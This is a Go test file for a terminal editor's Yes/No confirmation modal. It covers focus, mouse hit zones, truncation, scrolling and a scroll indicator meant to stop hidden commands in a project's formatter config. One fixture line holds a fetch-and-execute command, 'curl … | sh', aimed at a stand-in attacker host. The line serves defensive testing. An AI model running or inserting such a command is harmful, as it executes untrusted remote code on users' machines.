// =============================================================================
// File: internal/overlay/confirm_test.go
// Author: John Lam <johnlam90@gmail.com>
// Created: 2026-08-02
// Copyright: 2026 John Lam. All rights reserved.
// =============================================================================

package overlay

import (
	"strings"
	"testing"

	"github.com/gdamore/tcell/v2"

	"github.com/johnlam90/skiff/internal/scrollbar"
	"github.com/johnlam90/skiff/internal/theme"
)

// testConfirm builds a Confirm on an 80×24 screen with an ordered call
// log, so tests can pin both what fired and that Close came first.
func testConfirm() (*Confirm, *[]string) {
	var log []string
	c := &Confirm{
		Title:   "T",
		Message: "sure?",
		Theme:   theme.Default(),
		Size:    func() (int, int) { return 80, 24 },
	}
	c.Close = func() { log = append(log, "close") }
	c.OnYes = func() { log = append(log, "yes") }
	c.OnCancel = func() { log = append(log, "cancel") }
	return c, &log
}

// TestConfirm_DefaultFocusIsNo pins the safety default: a zero Hover is
// the No button, so an accidental Enter cancels rather than confirms a
// destructive action.
func TestConfirm_DefaultFocusIsNo(t *testing.T) {
	c, log := testConfirm()
	c.HandleKey(key(tcell.KeyEnter, 0))
	if len(*log) != 2 || (*log)[1] != "cancel" {
		t.Fatalf("Enter on default focus must cancel, got %v", *log)
	}
}

// TestConfirm_FocusKeysAndYes pins the focus keys — Right arms Yes, Tab
// toggles, Left returns to No — and that Enter on Yes closes before
// OnYes runs (capture-then-close).
func TestConfirm_FocusKeysAndYes(t *testing.T) {
	c, log := testConfirm()
	c.HandleKey(key(tcell.KeyRight, 0))
	if c.Hover != 1 {
		t.Fatal("Right must focus Yes")
	}
	c.HandleKey(key(tcell.KeyTab, 0))
	if c.Hover != 0 {
		t.Fatal("Tab must toggle back to No")
	}
	c.HandleKey(key(tcell.KeyTab, 0))
	c.HandleKey(key(tcell.KeyEnter, 0))
	if len(*log) != 2 || (*log)[0] != "close" || (*log)[1] != "yes" {
		t.Fatalf("want [close yes], got %v", *log)
	}
}

// TestConfirm_EscRunsCancelHook pins the dismissal contract the
// formatter-trust flow depends on: Esc closes first, then OnCancel
// records the denial — and the hook lives on this value, so it can
// never leak into an unrelated confirm.
func TestConfirm_EscRunsCancelHook(t *testing.T) {
	c, log := testConfirm()
	c.HandleKey(key(tcell.KeyEsc, 0))
	if len(*log) != 2 || (*log)[0] != "close" || (*log)[1] != "cancel" {
		t.Fatalf("want [close cancel], got %v", *log)
	}
}

// TestConfirm_MouseZonesMatchDrawnButtons pins that the click zones sit
// exactly where the buttons are painted — the draw and hit-test share
// the confirmBtn* columns, so they can't drift.
func TestConfirm_MouseZonesMatchDrawnButtons(t *testing.T) {
	r := Centered(80, 24, confirmWidth, confirmHeight)

	c, log := testConfirm()
	c.HandleMouse(r.X+confirmBtnYesX+1, r.Y+5, tcell.Button1)
	if len(*log) != 2 || (*log)[1] != "yes" {
		t.Fatalf("Yes click: got %v", *log)
	}

	c, log = testConfirm()
	c.HandleMouse(r.X+confirmBtnNoX+1, r.Y+5, tcell.Button1)
	if len(*log) != 2 || (*log)[1] != "cancel" {
		t.Fatalf("No click: got %v", *log)
	}

	c, log = testConfirm()
	c.HandleMouse(r.X-1, r.Y, tcell.Button1)
	if len(*log) != 2 || (*log)[1] != "cancel" {
		t.Fatalf("outside click must cancel, got %v", *log)
	}

	c, _ = testConfirm()
	c.HandleMouse(r.X+confirmBtnYesX+1, r.Y+5, tcell.ButtonNone)
	if c.Hover != 1 {
		t.Fatal("motion over Yes must move the hover highlight")
	}
}

// TestConfirm_DrawTruncatesMessageByRunes pins the rune-safe
// truncation: a multibyte message longer than the modal must clip at a
// rune boundary with an ellipsis, never split a rune into garbage.
func TestConfirm_DrawTruncatesMessageByRunes(t *testing.T) {
	scr := simScreen(t)
	c, _ := testConfirm()
	for i := 0; i < 40; i++ {
		c.Message += "über"
	}
	c.Draw(scr)
	scr.Show()
	r := Centered(80, 24, confirmWidth, confirmHeight)
	row := ""
	for x := r.X + 1; x < r.X+r.W-1; x++ {
		row += string(cellAt(scr, x, r.Y+4))
	}
	if len([]rune(row)) > r.W-2 {
		t.Fatalf("message row overflows the modal: %d runes", len([]rune(row)))
	}
	found := false
	for _, ch := range row {
		if ch == '…' {
			found = true
		}
	}
	if !found {
		t.Fatal("truncated message must end in an ellipsis")
	}
}

// -----------------------------------------------------------------------------
// Multi-line Body mode
// -----------------------------------------------------------------------------

// bodyConfirm builds a Body-mode Confirm with n numbered rows so tests
// can reason about which row is visible at a given scroll offset.
func bodyConfirm(n int) (*Confirm, *[]string) {
	c, log := testConfirm()
	c.Body = make([]string, n)
	for i := range n {
		c.Body[i] = "row" + string(rune('A'+i))
	}
	return c, log
}

// TestConfirm_EmptyBodyKeepsClassicGeometry is the compatibility pin:
// every existing confirm in the app passes only Message, so the frame
// size and the button row must stay exactly where they were before Body
// existed — otherwise every Yes/No hit zone in the editor shifts.
//
// The rect is spelled out rather than recomputed with
// Centered(80, 24, confirmWidth, confirmHeight): that is the very
// expression rect() evaluates on the empty-body path, so an expectation
// built from it tracks any drift instead of catching it.
func TestConfirm_EmptyBodyKeepsClassicGeometry(t *testing.T) {
	c, _ := testConfirm()
	want := Rect{X: 13, Y: 7, W: 54, H: 9} // 80×24 screen, 54×9 modal
	if r := c.rect(); r != want {
		t.Fatalf("message-only rect drifted: got %+v want %+v", r, want)
	}
	if c.buttonRow() != 5 || c.buttonOffset() != 0 {
		t.Fatalf("button geometry drifted: row=%d offset=%d", c.buttonRow(), c.buttonOffset())
	}
}

// TestConfirm_BodyTextWidth pins the wrap width callers should build a
// multi-line Body to: the frame's usable text columns at its current
// runtime width, not the ConfirmBodyTextWidth constant. Callers that
// wrap to this value instead of the constant get a narrower wrap on a
// narrow terminal, so Draw's own trimRunes never has to truncate a
// row (and hide a command's tail behind an ellipsis).
func TestConfirm_BodyTextWidth(t *testing.T) {
	c, _ := bodyConfirm(1)
	c.Size = func() (int, int) { return 120, 24 }
	if got := c.BodyTextWidth(); got != ConfirmBodyTextWidth {
		t.Fatalf("wide screen: got %d want %d", got, ConfirmBodyTextWidth)
	}
	c.Size = func() (int, int) { return 60, 24 }
	if got, want := c.BodyTextWidth(), 60-4; got != want {
		t.Fatalf("narrow screen: got %d want %d", got, want)
	}
}

// TestConfirm_BodyGrowsFrameAndMovesButtons pins the Body layout: the
// frame widens to fit commands and gets one row per body line, and the
// buttons move below the content instead of being painted over it.
//
// The width pin moved from a flat ConfirmBodyWidth to "as wide as the
// terminal allows". ConfirmBodyWidth is 84 and the fixture screen is 80,
// so the old expectation was pinning a frame whose right border and
// scroll indicator sat in columns the screen did not have — on exactly
// the 80-column tmux pane the trust prompt is read in.
func TestConfirm_BodyGrowsFrameAndMovesButtons(t *testing.T) {
	c, _ := bodyConfirm(5)
	r := c.rect()
	if r.W != 80 {
		t.Fatalf("body frame on an 80-column screen: got %d want 80", r.W)
	}
	if r.X+r.W > 80 {
		t.Fatalf("frame runs off the screen: X=%d W=%d", r.X, r.W)
	}
	if r.H != confirmChromeRows+5 {
		t.Fatalf("body frame height: got %d want %d", r.H, confirmChromeRows+5)
	}
	if c.buttonRow() != 9 {
		t.Fatalf("buttons should sit below 5 body rows, got relY %d", c.buttonRow())
	}

	// Given room, it still grows to the full wide form — the clamp is a
	// ceiling, not a new natural width.
	c.Size = func() (int, int) { return 100, 24 }
	if got := c.rect().W; got != ConfirmBodyWidth {
		t.Fatalf("body frame with room to grow: got %d want %d", got, ConfirmBodyWidth)
	}
}

// TestConfirm_BodyButtonsStayClickable is the one that would silently
// break the trust prompt: with the taller frame, the drawn buttons and
// the mouse hit zones must still agree, or Yes stops responding.
func TestConfirm_BodyButtonsStayClickable(t *testing.T) {
	c, log := bodyConfirm(5)
	r := c.rect()
	yesX := r.X + c.buttonOffset() + confirmBtnYesX
	c.HandleMouse(yesX+1, r.Y+c.buttonRow(), tcell.Button1)
	if len(*log) != 2 || (*log)[1] != "yes" {
		t.Fatalf("Yes click in Body mode: got %v", *log)
	}

	c, log = bodyConfirm(5)
	noX := r.X + c.buttonOffset() + confirmBtnNoX
	c.HandleMouse(noX+1, r.Y+c.buttonRow(), tcell.Button1)
	if len(*log) != 2 || (*log)[1] != "cancel" {
		t.Fatalf("No click in Body mode: got %v", *log)
	}
}

// TestConfirm_BodyScrollsPastTheCap covers a body longer than the row
// cap: the overflow must stay reachable by wheel and arrow keys. A
// hostile format.json with dozens of entries would otherwise push its
// payload out of view, which is the whole hole Body exists to close.
func TestConfirm_BodyScrollsPastTheCap(t *testing.T) {
	c, _ := bodyConfirm(confirmMaxBodyRows + 6)
	if c.bodyRows() != confirmMaxBodyRows {
		t.Fatalf("visible rows should clamp to the cap, got %d", c.bodyRows())
	}
	c.HandleKey(key(tcell.KeyDown, 0))
	if c.Scroll() != 1 {
		t.Fatalf("Down should scroll the body, got %d", c.Scroll())
	}
	c.HandleMouse(40, 12, tcell.WheelDown)
	if c.Scroll() != 4 {
		t.Fatalf("wheel should scroll 3 rows, got %d", c.Scroll())
	}
	c.HandleKey(key(tcell.KeyPgDn, 0))
	if got, want := c.Scroll(), len(c.Body)-c.bodyRows(); got != want {
		t.Fatalf("PgDn should clamp to the last page: got %d want %d", got, want)
	}
	c.HandleKey(key(tcell.KeyPgUp, 0))
	if c.Scroll() != 0 {
		t.Fatalf("PgUp should return to the top, got %d", c.Scroll())
	}
}

// TestConfirm_MessageFormCannotScroll pins that the scroll plumbing is
// inert for the one-line form — a stray wheel event over a delete
// confirm must not blank its message.
func TestConfirm_MessageFormCannotScroll(t *testing.T) {
	c, _ := testConfirm()
	c.HandleMouse(40, 12, tcell.WheelDown)
	c.HandleKey(key(tcell.KeyDown, 0))
	if c.Scroll() != 0 {
		t.Fatalf("message-only confirm must not scroll, got %d", c.Scroll())
	}
}

// TestConfirm_DrawsBodyRowsLeftAligned pins the rendering: body rows are
// painted left-aligned inside the padding, because commands and paths
// are read left-to-right and centering them makes columns unscannable.
func TestConfirm_DrawsBodyRowsLeftAligned(t *testing.T) {
	scr := simScreen(t)
	c, _ := bodyConfirm(3)
	c.Draw(scr)
	scr.Show()

	r := c.rect()
	for i := range 3 {
		got := ""
		for x := r.X + 2; x < r.X+2+len(c.Body[i]); x++ {
			got += string(cellAt(scr, x, r.Y+4+i))
		}
		if got != c.Body[i] {
			t.Fatalf("body row %d: got %q want %q", i, got, c.Body[i])
		}
	}
}

// -----------------------------------------------------------------------------
// Body scroll indicator
// -----------------------------------------------------------------------------

// wideBodyConfirm builds a Body-mode Confirm with n numbered rows on a
// 100×30 screen, plus the screen to draw it on. Wider than
// testConfirm's 80 columns deliberately: ConfirmBodyWidth is 84 and
// Centered does not shrink a frame that outgrows the screen, so on 80
// columns the frame's right edge — border and indicator alike — falls
// off the terminal. The indicator tests need a terminal that can show
// the column they are about.
func wideBodyConfirm(t *testing.T, n int) (*Confirm, tcell.SimulationScreen) {
	t.Helper()
	scr := tcell.NewSimulationScreen("UTF-8")
	if err := scr.Init(); err != nil {
		t.Fatalf("init: %v", err)
	}
	t.Cleanup(scr.Fini)
	scr.SetSize(100, 30)

	c := &Confirm{
		Title: "Trust this project's formatters?",
		Theme: theme.Default(),
		Size:  func() (int, int) { return 100, 30 },
		Body:  make([]string, n),
	}
	c.Close = func() {}
	for i := range n {
		c.Body[i] = "gofmt -w file" + string(rune('a'+i%26)) + ".go"
	}
	return c, scr
}

// confirmBarColumn draws c and reads its indicator column back across
// the body rows — the cells a user would actually see.
func confirmBarColumn(t *testing.T, scr tcell.SimulationScreen, c *Confirm) string {
	t.Helper()
	c.Draw(scr)
	scr.Show()
	return barCol(scr, c.bar(c.rect()))
}

// TestConfirm_TrustPromptShowsCommandsExistBelowTheFold is the consent
// case, and the reason this indicator is a security fix rather than
// polish. A project's .skiff/format.json can declare more commands than
// confirmMaxBodyRows shows, and this prompt exists so the user can read
// the exact argv before allowing any of it to run. With nothing on
// screen saying the list continues, a hostile repo only has to pad its
// config until the `bash -c curl … | sh` entry sits past row 14: the
// prompt looks complete, and the user consents to a command they were
// never shown. The bar is what makes the hidden rows visible AS hidden.
func TestConfirm_TrustPromptShowsCommandsExistBelowTheFold(t *testing.T) {
	c, scr := wideBodyConfirm(t, 30)
	const payloadRow = 19
	c.Body[payloadRow] = "bash -c curl https://evil.example/x | sh"

	if c.bodyRows() > payloadRow {
		t.Fatalf("fixture broken: row %d is on screen, nothing is hidden", payloadRow)
	}
	col := confirmBarColumn(t, scr, c)
	if !strings.ContainsRune(col, scrollbar.Thumb) || !strings.ContainsRune(col, scrollbar.Track) {
		t.Fatalf("a 30-command consent body must show both thumb and track, got %q", col)
	}
	// Track below the thumb is the specific claim "there is more under
	// this" — a thumb pinned to the bottom would say the opposite.
	if idx := strings.IndexRune(col, scrollbar.Track); idx <= strings.LastIndex(col, string(scrollbar.Thumb)) {
		t.Fatalf("at the top of the body the track must continue below the thumb, got %q", col)
	}
	// And scrolling really does reach the payload row.
	c.ScrollBy(payloadRow)
	if c.Scroll() > payloadRow {
		t.Fatalf("scroll overshot the payload row: %d", c.Scroll())
	}
	c.Draw(scr)
	scr.Show()
	r := c.rect()
	got := ""
	for x := r.X + 2; x < r.X+2+len(c.Body[payloadRow]); x++ {
		got += string(cellAt(scr, x, r.Y+4+(payloadRow-c.Scroll())))
	}
	if got != c.Body[payloadRow] {
		t.Fatalf("the hidden command must be reachable, got %q", got)
	}
}

// TestConfirm_NoIndicatorWhenBodyFits pins the no-noise half: a body
// that is fully on screen gets a blank padding column, because a
// full-height thumb would only add ink without adding information.
func TestConfirm_NoIndicatorWhenBodyFits(t *testing.T) {
	c, scr := wideBodyConfirm(t, confirmMaxBodyRows)
	col := confirmBarColumn(t, scr, c)
	if strings.ContainsAny(col, string([]rune{scrollbar.Track, scrollbar.Thumb})) {
		t.Fatalf("a body that fits must draw no bar, got %q", col)
	}
}

// TestConfirm_IndicatorThumbFollowsTheScroll pins that the bar reports
// position and not merely existence: at the top the thumb is at the top
// of the track, and scrolling to the end pins it to the bottom.
func TestConfirm_IndicatorThumbFollowsTheScroll(t *testing.T) {
	c, scr := wideBodyConfirm(t, 30)
	top := confirmBarColumn(t, scr, c)
	if !strings.HasPrefix(top, string(scrollbar.Thumb)) {
		t.Fatalf("at scroll 0 the thumb must start the track, got %q", top)
	}

	c.ScrollBy(len(c.Body))
	bottom := confirmBarColumn(t, scr, c)
	if !strings.HasSuffix(bottom, string(scrollbar.Thumb)) {
		t.Fatalf("at the end the thumb must finish the track, got %q", bottom)
	}
	if top == bottom {
		t.Fatalf("the thumb must move with the body, stuck at %q", top)
	}

	wantStart, wantLen, ok := scrollbar.Geom(len(c.Body), c.bodyRows(), c.Scroll())
	if !ok {
		t.Fatal("fixture should overflow")
	}
	for row, got := range []rune(bottom) {
		want := scrollbar.Track
		if row >= wantStart && row < wantStart+wantLen {
			want = scrollbar.Thumb
		}
		if got != want {
			t.Fatalf("bar row %d: got %q, want %q (col %q)", row, got, want, bottom)
		}
	}
}

// TestConfirm_BarClickJumpsWithoutTouchingTheButtons pins the mouse
// contract on the new column: a press scrolls the body and nothing
// else — it must not read as a Yes, a No, or an outside-click cancel,
// which on a trust prompt would be a click that silently answers the
// question.
func TestConfirm_BarClickJumpsWithoutTouchingTheButtons(t *testing.T) {
	c, scr := wideBodyConfirm(t, 30)
	var log []string
	c.Close = func() { log = append(log, "close") }
	c.OnYes = func() { log = append(log, "yes") }
	c.OnCancel = func() { log = append(log, "cancel") }
	confirmBarColumn(t, scr, c)

	b := c.bar(c.rect())
	c.HandleMouse(b.x, b.top+b.viewH-1, tcell.Button1)
	if want := len(c.Body) - c.bodyRows(); c.Scroll() != want {
		t.Fatalf("press at the foot of the bar: scroll %d, want %d", c.Scroll(), want)
	}
	if len(log) != 0 {
		t.Fatalf("a bar press must not answer the prompt, got %v", log)
	}
	c.HandleMouse(b.x, b.top, tcell.Button1)
	if c.Scroll() != 0 {
		t.Fatalf("press at the head of the bar should return to the top, got %d", c.Scroll())
	}
	if len(log) != 0 {
		t.Fatalf("a bar press must not answer the prompt, got %v", log)
	}
}

// TestConfirm_ClassicFormDrawsNoIndicator is the other half of the
// compatibility pin next to TestConfirm_EmptyBodyKeepsClassicGeometry:
// the size is unchanged, and so is every cell. len(Body) is zero in the
// Message form, so the bar is arithmetically impossible there — no
// scrollbar glyph may appear anywhere on the screen, and the frame's
// padding column stays blank down its whole height.
func TestConfirm_ClassicFormDrawsNoIndicator(t *testing.T) {
	scr := simScreen(t)
	c, _ := testConfirm()
	c.Draw(scr)
	scr.Show()

	r := c.rect()
	if (r != Rect{X: 13, Y: 7, W: 54, H: 9}) {
		t.Fatalf("classic geometry drifted: %+v", r)
	}
	_, w, h := scr.GetContents()
	for y := range h {
		for x := range w {
			if got := cellAt(scr, x, y); got == scrollbar.Track || got == scrollbar.Thumb {
				t.Fatalf("classic confirm painted a bar glyph %q at (%d,%d)", got, x, y)
			}
		}
	}
	// Below the title divider (which spans the full inner width by
	// design) every content row's padding column stays blank.
	for y := r.Y + 3; y < r.Y+r.H-1; y++ {
		if got := cellAt(scr, barColumn(r), y); got != ' ' {
			t.Fatalf("padding column row %d = %q, want a blank cell", y, got)
		}
	}
}

// TestConfirm_PhoneWidthKeepsFrameAndButtonsOnScreen is the minimum-size
// case: at skiff's 40-column floor the classic 54-cell frame has to
// narrow, taking the No / Yes pair with it. Unclamped, the frame pinned
// to column 0 and painted its right border, its whole right-hand half and
// the Yes button's trailing bracket into columns the terminal does not
// have — on the destructive-action modal, of all of them.
func TestConfirm_PhoneWidthKeepsFrameAndButtonsOnScreen(t *testing.T) {
	const scrW, scrH = 40, 10
	c, log := testConfirm()
	c.Size = func() (int, int) { return scrW, scrH }

	r := c.rect()
	if r.X < 0 || r.X+r.W > scrW || r.Y < 0 || r.Y+r.H > scrH {
		t.Fatalf("frame off screen: %+v on %dx%d", r, scrW, scrH)
	}
	// buttonCols measures against frameWidth and Draw paints into
	// rect().W; a disagreement places the buttons inside a frame that
	// does not exist.
	if c.frameWidth() != r.W {
		t.Fatalf("frameWidth %d but rect is %d wide", c.frameWidth(), r.W)
	}
	noX, yesX := c.buttonCols()
	if noX < 1 || yesX+confirmBtnYesW > r.W-1 {
		t.Fatalf("buttons outside the %d-cell frame: no=%d yes=%d", r.W, noX, yesX)
	}
	if noX+confirmBtnNoW >= yesX {
		t.Fatalf("No and Yes overlap: no=%d yes=%d", noX, yesX)
	}

	// Painted and clickable must be the same cells — the whole reason
	// buttonCols exists rather than two copies of the arithmetic.
	c.HandleMouse(r.X+yesX+1, r.Y+c.buttonRow(), tcell.Button1)
	if len(*log) != 2 || (*log)[1] != "yes" {
		t.Fatalf("Yes click at the squeezed column: got %v", *log)
	}
}

// TestConfirm_ShortScreenKeepsButtonRowVisible pins the height half: the
// nine-row classic form is exactly what sets skiff's minHeight, so at ten
// rows it must fit whole — buttons included — with the status bar's row
// left over underneath it.
func TestConfirm_ShortScreenKeepsButtonRowVisible(t *testing.T) {
	const scrH = 10
	c, _ := testConfirm()
	c.Size = func() (int, int) { return 80, scrH }

	r := c.rect()
	if r.H != confirmHeight {
		t.Fatalf("the classic form must keep its %d rows, got %d", confirmHeight, r.H)
	}
	if btnY := r.Y + c.buttonRow(); btnY >= scrH {
		t.Fatalf("button row at %d is off a %d-row screen", btnY, scrH)
	}
	if r.Y+r.H > scrH-1 {
		t.Fatalf("modal covers the status bar row: %+v on %d rows", r, scrH)
	}
}
